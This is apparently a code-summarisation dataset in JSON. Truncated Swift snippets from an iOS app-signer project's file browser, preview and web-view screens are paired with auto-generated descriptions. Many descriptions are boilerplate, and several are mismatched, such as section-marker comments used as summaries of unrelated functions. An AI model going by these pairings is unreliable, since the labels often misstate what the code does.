    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewTableHandlers.swift",
    "code_type": "class"
  },
  {
    "id": "2613",
    "code": "func tableView(_ tableView: UITableView,\nperformDropWith coordinator: UITableViewDropCoordinator,\nfileList: inout [File],\ndocumentsDirectory _: URL,\nloadFiles: @escaping () -> Void)\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewTableHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2614",
    "code": "private func performFileReorder(tableView: UITableView,\nsourceIndex: Int,\ndestinationIndexPath: IndexPath,\nfileList: inout [File],\ncompletion: @escaping () -> Void)\n{",
    "nl": "Function performFileReorder - implements performfilereorder functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewTableHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2615",
    "code": "class FileTableViewCell: UITableViewCell {\nlet fileIconImageView = UIImageView()\nlet fileNameLabel = UILabel()\nlet fileSizeLabel = UILabel()\nlet fileDateLabel = UILabel()\n\noverride init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {",
    "nl": "class FileTableViewCell - implements functionality related to file table view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2616",
    "code": "private func setupUI() {\ncontentView.addSubview(fileIconImageView)\ncontentView.addSubview(fileNameLabel)\ncontentView.addSubview(fileSizeLabel)\ncontentView.addSubview(fileDateLabel)\n\nfileIconImageView.translatesAutoresizingMaskIntoConstraints = false\nfileNameLabel.translatesAutoresizingMaskIntoConstraints = false\nfileSizeLabel.translatesAutoresizingMaskIntoConstraints = false\nfileDateLabel.translatesAutoresizingMaskIntoConstraints = false",
    "nl": "Function setupUI - sets upui",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2617",
    "code": "func configure(with file: File, in viewController: UIViewController, onActionPerformed: @escaping () -> Void) {\nfileNameLabel.text = file.name\nfileSizeLabel.text = ByteCountFormatter.string(fromByteCount: Int64(file.size), countStyle: .file)\nlet dateFormatter = DateFormatter()\ndateFormatter.dateStyle = .medium\ndateFormatter.timeStyle = .short\nfileDateLabel.text = dateFormatter.string(from: file.date)\nfileIconImageView.image = UIImage(named: file.iconName) ?? UIImage(systemName: file.iconName)\naccessibilityElements = [fileIconImageView, fileNameLabel, fileSizeLabel, fileDateLabel]\n",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2618",
    "code": "@objc private func handleLongPress(_ gesture: UILongPressGestureRecognizer) {\nif gesture.state == .began {",
    "nl": "Function handleLongPress - implements handlelongpress functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2619",
    "code": "class File: Equatable {\n/// URL of the file\nlet url: URL\n\n/// File name (cached)\nlet name: String\n\n/// File size in bytes (cached)\nlet size: UInt64\n",
    "nl": "/ Represents a file in the file system with cached attributes for performance",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2620",
    "code": "func formattedSize() -> String {\nreturn ByteCountFormatter.string(fromByteCount: Int64(size), countStyle: .file)\n}\n\n/// Format the date for display\n/// - Returns: Formatted date string\nfunc formattedDate() -> String {",
    "nl": "/ Format the file size for display / - Returns: Human-readable file size string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2621",
    "code": "func formattedDate() -> String {\nlet formatter = DateFormatter()\nformatter.dateStyle = .medium\nformatter.timeStyle = .short\nreturn formatter.string(from: date)\n}\n\n/// Equatable implementation\nstatic func == (lhs: File, rhs: File) -> Bool {",
    "nl": "/ Format the date for display / - Returns: Formatted date string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/FileTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2622",
    "code": "class HomeViewUI {\nstatic let navigationBar: UINavigationBar = {",
    "nl": "class HomeViewUI - implements functionality related to home view u i",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/HomeViewUI.swift",
    "code_type": "class"
  },
  {
    "id": "2623",
    "code": "extension UIButton {\nfunc addGradientBackground() {",
    "nl": "extension UIButton - implements functionality related to u i button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/HomeViewUI.swift",
    "code_type": "extension"
  },
  {
    "id": "2624",
    "code": "func addGradientBackground() {\nlet gradient = CAGradientLayer()\ngradient.frame = bounds\ngradient.colors = [UIColor.systemBlue.cgColor, UIColor.systemCyan.cgColor]\ngradient.startPoint = CGPoint.zero\ngradient.endPoint = CGPoint(x: 1, y: 1)\ngradient.cornerRadius = 10\nlayer.insertSublayer(gradient, at: 0)\n}\n}",
    "nl": "Function addGradientBackground - implements addgradientbackground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/HomeViewUI.swift",
    "code_type": "function"
  },
  {
    "id": "2625",
    "code": "class IconManager {\nstatic let shared = IconManager()\nprivate let fileManager = FileManager.default\nprivate let iconBundleURL = Bundle.main.url(forResource: \"Icons\", withExtension: \"bundle\")!\n\nfunc loadIcon(for name: String) -> UIImage? {",
    "nl": "class IconManager - Manages system resources and operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/IconManager.swift",
    "code_type": "class"
  },
  {
    "id": "2626",
    "code": "func loadIcon(for name: String) -> UIImage? {\nlet iconPath = iconBundleURL.appendingPathComponent(\"\\(name).png\")\nreturn UIImage(contentsOfFile: iconPath.path)\n}\n\nfunc registerCustomIcons() {",
    "nl": "Function loadIcon - implements loadicon functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/IconManager.swift",
    "code_type": "function"
  },
  {
    "id": "2627",
    "code": "func registerCustomIcons() {\n// Ensure icons are bundled; these can be generated via image generation tool\nlet iconNames = [\"iconText\", \"iconPlist\", \"iconIPA\", \"iconZip\", \"iconPDF\", \"iconGeneric\"]\nfor name in iconNames {",
    "nl": "Function registerCustomIcons - implements registercustomicons functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/UI/IconManager.swift",
    "code_type": "function"
  },
  {
    "id": "2628",
    "code": "class FilePreviewController: UIViewController, QLPreviewControllerDataSource, QLPreviewControllerDelegate {\n// MARK: - Properties\n\n/// The file URL to preview\nprivate let fileURL: URL\n\n/// The preview controller\nprivate let previewController = QLPreviewController()\n\n// MARK: - Initialization",
    "nl": "class FilePreviewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift",
    "code_type": "class"
  },
  {
    "id": "2629",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupPreviewController()\n}\n\n// MARK: - Setup\n\n/// Sets up the preview controller\nprivate func setupPreviewController() {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift",
    "code_type": "function"
  },
  {
    "id": "2630",
    "code": "private func setupPreviewController() {\npreviewController.dataSource = self\npreviewController.delegate = self\naddChild(previewController)\nview.addSubview(previewController.view)\npreviewController.view.frame = view.bounds\npreviewController.view.autoresizingMask = [.flexibleWidth, .flexibleHeight]\npreviewController.didMove(toParent: self)\n}\n",
    "nl": "MARK: - Setup / Sets up the preview controller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift",
    "code_type": "function"
  },
  {
    "id": "2631",
    "code": "func numberOfPreviewItems(in _: QLPreviewController) -> Int {\nreturn 1\n}\n\nfunc previewController(_: QLPreviewController, previewItemAt _: Int) -> QLPreviewItem {",
    "nl": "MARK: - QLPreviewControllerDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift",
    "code_type": "function"
  },
  {
    "id": "2632",
    "code": "func previewController(_: QLPreviewController, previewItemAt _: Int) -> QLPreviewItem {\nreturn fileURL as QLPreviewItem\n}\n\n// MARK: - QLPreviewControllerDelegate\n\nfunc previewController(_: QLPreviewController, didUpdateContentsOf _: QLPreviewItem) {",
    "nl": "Function previewController - implements previewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift",
    "code_type": "function"
  },
  {
    "id": "2633",
    "code": "func previewController(_: QLPreviewController, didUpdateContentsOf _: QLPreviewItem) {\n// Handle any updates if needed\n}\n}\n\n// Proprietary Software License Version 1.0\n//\n// Copyright (C) 2025 BDG\n//\n// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted",
    "nl": "MARK: - QLPreviewControllerDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewController.swift",
    "code_type": "function"
  },
  {
    "id": "2634",
    "code": "class FilePreviewManager {\n/// Present a preview for a file using QuickLook\n/// - Parameters:\n///   - file: The file to preview\n///   - viewController: The view controller to present from\nstatic func presentPreview(for file: File, from viewController: UIViewController) {",
    "nl": "class FilePreviewManager - Manages system resources and operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewManager.swift",
    "code_type": "class"
  },
  {
    "id": "2635",
    "code": "static func presentPreview(for file: File, from viewController: UIViewController) {\nguard FileManager.default.fileExists(atPath: file.url.path) else {",
    "nl": "/ Present a preview for a file using QuickLook / - Parameters: /   - file: The file to preview /   - viewController: The view controller to present from",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewManager.swift",
    "code_type": "function"
  },
  {
    "id": "2636",
    "code": "static func supportedFileExtensions() -> [String] {\nreturn [\n// Documents\n\"pdf\", \"doc\", \"docx\", \"pages\",\n\"xls\", \"xlsx\", \"numbers\",\n\"ppt\", \"pptx\", \"key\",\n\n// Images\n\"jpg\", \"jpeg\", \"png\", \"gif\", \"heic\", \"webp\", \"tiff\", \"bmp\", \"svg\",\n",
    "nl": "/ Get a list of supported file extensions for preview / - Returns: Array of supported file extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewManager.swift",
    "code_type": "function"
  },
  {
    "id": "2637",
    "code": "static func canPreview(_ file: File) -> Bool {\nlet fileExtension = file.url.pathExtension.lowercased()\nreturn supportedFileExtensions().contains(fileExtension) ||\nQLPreviewController.canPreview(file.url as QLPreviewItem)\n}\n}\n",
    "nl": "/ Check if a file can be previewed / - Parameter file: The file to check / - Returns: True if the file can be previewed",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewManager.swift",
    "code_type": "function"
  },
  {
    "id": "2638",
    "code": "extension HomeViewController {\n/// Present a preview for a file\n/// - Parameter file: The file to preview\nfunc presentFilePreview(for file: File) {",
    "nl": "Important helper functions for file previews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeFilePreviewHelpers.swift",
    "code_type": "extension"
  },
  {
    "id": "2639",
    "code": "func presentFilePreview(for file: File) {\n// Check if the file exists\nguard FileManager.default.fileExists(atPath: file.url.path) else {",
    "nl": "/ Present a preview for a file / - Parameter file: The file to preview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeFilePreviewHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2640",
    "code": "func presentImagePreview(for file: File) {\npresentFilePreview(for: file)\n}\n}\n",
    "nl": "/ Present an image preview / - Parameter file: The image file to preview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeFilePreviewHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2641",
    "code": "enum FileAppError: Error {\ncase fileNotFound(String)\ncase fileAlreadyExists(String)\ncase invalidFileName(String)\ncase invalidFileType(String)\ncase permissionDenied(String)\ncase directoryCreationFailed(String)\ncase fileCreationFailed(String)\ncase fileRenameFailed(String, String)\ncase fileDeleteFailed(String)",
    "nl": "enum FileAppError - implements functionality related to file app error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "enum"
  },
  {
    "id": "2642",
    "code": "struct AlertConfig {\nlet title: String?\nlet message: String?\nlet style: UIAlertController.Style\nlet actions: [AlertActionConfig]\nlet preferredAction: Int?\nlet completionHandler: (() -> Void)?\n}\n\nstruct AlertActionConfig {",
    "nl": "struct AlertConfig - implements functionality related to alert config",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "struct"
  },
  {
    "id": "2643",
    "code": "struct AlertActionConfig {\nlet title: String?\nlet style: UIAlertAction.Style\nlet handler: (() -> Void)?\n}\n\nclass HomeViewUtilities {",
    "nl": "struct AlertActionConfig - implements functionality related to alert action config",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "struct"
  },
  {
    "id": "2644",
    "code": "class HomeViewUtilities {\nfunc handleError(in viewController: UIViewController, error: Error, withTitle title: String) {",
    "nl": "class HomeViewUtilities - implements functionality related to home view utilities",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "class"
  },
  {
    "id": "2645",
    "code": "func handleError(in viewController: UIViewController, error: Error, withTitle title: String) {\nvar message: String\nswitch error {",
    "nl": "Function handleError - implements handleerror functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "function"
  },
  {
    "id": "2646",
    "code": "private func formatFileAppError(_ error: FileAppError) -> String {\nswitch error {",
    "nl": "Function formatFileAppError - implements formatfileapperror functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "function"
  },
  {
    "id": "2647",
    "code": "extension UIViewController {\nfunc presentAlert(config: AlertConfig) {",
    "nl": "extension UIViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "extension"
  },
  {
    "id": "2648",
    "code": "func presentAlert(config: AlertConfig) {\nlet alert = UIAlertController(title: config.title, message: config.message, preferredStyle: config.style)\n\nif let preferredActionIndex = config.preferredAction, preferredActionIndex < config.actions.count {",
    "nl": "Function presentAlert - implements presentalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "function"
  },
  {
    "id": "2649",
    "code": "class HapticFeedbackGenerator {\nstatic func generateHapticFeedback(style: UIImpactFeedbackGenerator.FeedbackStyle) {",
    "nl": "class HapticFeedbackGenerator - implements functionality related to haptic feedback generator",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "class"
  },
  {
    "id": "2650",
    "code": "static func generateHapticFeedback(style: UIImpactFeedbackGenerator.FeedbackStyle) {\nlet generator = UIImpactFeedbackGenerator(style: style)\ngenerator.prepare()\ngenerator.impactOccurred()\n}\n\nstatic func generateNotificationFeedback(type: UINotificationFeedbackGenerator.FeedbackType) {",
    "nl": "Function generateHapticFeedback - implements generatehapticfeedback functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "function"
  },
  {
    "id": "2651",
    "code": "static func generateNotificationFeedback(type: UINotificationFeedbackGenerator.FeedbackType) {\nlet generator = UINotificationFeedbackGenerator()\ngenerator.notificationOccurred(type)\n}\n}\n",
    "nl": "Function generateNotificationFeedback - implements generatenotificationfeedback functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift",
    "code_type": "function"
  },
  {
    "id": "2652",
    "code": "@preconcurrency class WebViewController: UIViewController, WKNavigationDelegate, UIScrollViewDelegate {\n// MARK: - UI Components\n\n/// Configured WebView with enhanced settings\nprivate let webView: WKWebView = {",
    "nl": "/ Enhanced WebViewController for BDG Hub with modern UI and features",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2653",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupWebView()\nsetupUI()\nsetupNavigationBar()\nsetupObservers()\nloadWebsite()\n\n// Set up delegates\nwebView.navigationDelegate = self",
    "nl": "MARK: - Lifecycle Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2654",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\n\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2655",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\nnavigationController?.navigationBar.prefersLargeTitles = false\n\n// Apply theme color to navigation bar\nnavigationController?.navigationBar.tintColor = UIColor(hex: \"#FF6482\") // Pink accent color\n}\n\noverride func viewDidAppear(_ animated: Bool) {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2656",
    "code": "override func viewDidAppear(_ animated: Bool) {\nsuper.viewDidAppear(animated)\nanimateShowFloatingButtons()\n}\n\n// This duplicate method has been merged with the previous implementation\n\n// MARK: - Setup Methods\n\nprivate func setupWebView() {",
    "nl": "Function viewDidAppear - implements viewdidappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2657",
    "code": "private func setupWebView() {\nwebView.scrollView.addSubview(refreshControl)\nwebView.scrollView.bounces = true\n}\n\nprivate func setupNavigationBar() {",
    "nl": "This duplicate method has been merged with the previous implementation MARK: - Setup Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2658",
    "code": "private func setupNavigationBar() {\n// Use branded logo view instead of search bar\nnavigationItem.titleView = logoView\nnavigationController?.navigationBar.prefersLargeTitles = false\n\n// Make the logo pulse slightly to draw attention\nDispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {",
    "nl": "Function setupNavigationBar - sets upnavigationbar",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2659",
    "code": "private func animateLogo() {\nUIView.animate(withDuration: 0.7, delay: 0, options: [.autoreverse, .repeat, .curveEaseInOut], animations: {",
    "nl": "Function animateLogo - implements animatelogo functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2660",
    "code": "private func showSuccessAnimation() {\n// Reset the pulse view\npulseEffectView.alpha = 0.8\npulseEffectView.transform = CGAffineTransform(scaleX: 0.8, y: 0.8)\n\n// Animate it growing and fading out\nUIView.animate(withDuration: 0.8, delay: 0, options: .curveEaseOut, animations: {",
    "nl": "Function showSuccessAnimation - implements showsuccessanimation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2661",
    "code": "private func setupUI() {\nview.backgroundColor = .systemBackground\n\n// Add webView, progressView, and pulse effect view\nview.addSubview(webView)\nview.addSubview(progressView)\nview.addSubview(pulseEffectView)\n\n// Add floating controls container with blur effect\nview.addSubview(floatingButtonsContainer)",
    "nl": "Function setupUI - sets upui",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2662",
    "code": "private func updateThemeButtonIcon() {\nlet currentStyle = traitCollection.userInterfaceStyle\nlet imageConfig = UIImage.SymbolConfiguration(pointSize: 16, weight: .medium)\n\n// Set the appropriate icon based on current mode\nlet iconName = currentStyle == .dark ? \"sun.max.fill\" : \"moon.fill\"\nthemeButton.setImage(UIImage(systemName: iconName, withConfiguration: imageConfig), for: .normal)\n}\n\nprivate func setupObservers() {",
    "nl": "Function updateThemeButtonIcon - updates themebuttonicon",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2663",
    "code": "private func setupObservers() {\n// Observe webView progress\nprogressObservation = webView.observe(\\.estimatedProgress, options: [.new]) { [weak self] _, change in",
    "nl": "Function setupObservers - sets upobservers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2664",
    "code": "override func observeValue(\nforKeyPath keyPath: String?,\nof _: Any?,\nchange _: [NSKeyValueChangeKey: Any]?,\ncontext _: UnsafeMutableRawPointer?\n) {",
    "nl": "Function observeValue - implements observevalue functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2665",
    "code": "private func loadWebsite() {\n// Always load the home URL - don't save last visited URL\n// This ensures the user always returns to the main page\nlet request = URLRequest(url: homeURL)\nwebView.load(request)\n}\n\n@objc private func refreshWebView() {",
    "nl": "MARK: - Web Loading Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2666",
    "code": "@objc private func refreshWebView() {\n// Always reload the home URL\nlet request = URLRequest(url: homeURL)\nwebView.load(request)\n}\n\n@objc private func goBack() {",
    "nl": "Function refreshWebView - implements refreshwebview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2667",
    "code": "@objc private func goBack() {\nif webView.canGoBack {",
    "nl": "Function goBack - implements goback functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2668",
    "code": "@objc private func goForward() {\nif webView.canGoForward {",
    "nl": "Function goForward - implements goforward functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2669",
    "code": "@objc private func reloadPage() {\nwebView.reload()\nanimateButton(reloadButton)\n\n// Show pulse animation on reload\nshowSuccessAnimation()\n}\n\n@objc private func goHome() {",
    "nl": "Function reloadPage - implements reloadpage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2670",
    "code": "@objc private func goHome() {\n// Always go to homeURL even if already there (forced refresh)\nlet request = URLRequest(url: homeURL)\nwebView.load(request)\n\n// Show pulse animation on home navigation\nshowSuccessAnimation()\n}\n\n@objc private func sharePage() {",
    "nl": "Function goHome - implements gohome functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2671",
    "code": "@objc private func sharePage() {\nguard let url = webView.url else { return }",
    "nl": "Function sharePage - implements sharepage functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2672",
    "code": "@objc private func toggleTheme() {\n// Toggle between light and dark mode\nlet currentStyle = view.window?.overrideUserInterfaceStyle ?? .unspecified\n\nswitch currentStyle {",
    "nl": "Function toggleTheme - implements toggletheme functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2673",
    "code": "private func updateButtonStates() {\n// Update button enabled states\nbackButton.isEnabled = webView.canGoBack\nbackButton.alpha = webView.canGoBack ? 1.0 : 0.4\n\nforwardButton.isEnabled = webView.canGoForward\nforwardButton.alpha = webView.canGoForward ? 1.0 : 0.4\n\n// Update share button for current URL\nshareButton.isEnabled = webView.url != nil",
    "nl": "MARK: - UI Update Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2674",
    "code": "private func updateProgress(_ value: Double) {\n// Show progress view only when loading\nif value < 1.0 && progressView.alpha == 0 {",
    "nl": "Function updateProgress - updates progress",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2675",
    "code": "@objc private func buttonTapped(_: UIButton) {\nlet feedbackGenerator = UIImpactFeedbackGenerator(style: .medium)\nfeedbackGenerator.prepare()\nfeedbackGenerator.impactOccurred(intensity: 0.7)\n}\n\nprivate func animateButton(_ button: UIButton) {",
    "nl": "MARK: - Button Animation Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2676",
    "code": "private func animateButton(_ button: UIButton) {\nUIView.animate(withDuration: 0.15, animations: {",
    "nl": "Function animateButton - implements animatebutton functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2677",
    "code": "private func animateShowFloatingButtons() {\nfloatingButtonsContainer.alpha = 0\nfloatingButtonsBottomConstraint?.constant = 20\n\nUIView.animate(\nwithDuration: 0.5,\ndelay: 0.2,\nusingSpringWithDamping: 0.7,\ninitialSpringVelocity: 0.5,\noptions: .curveEaseOut",
    "nl": "MARK: - Floating Buttons Animation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2678",
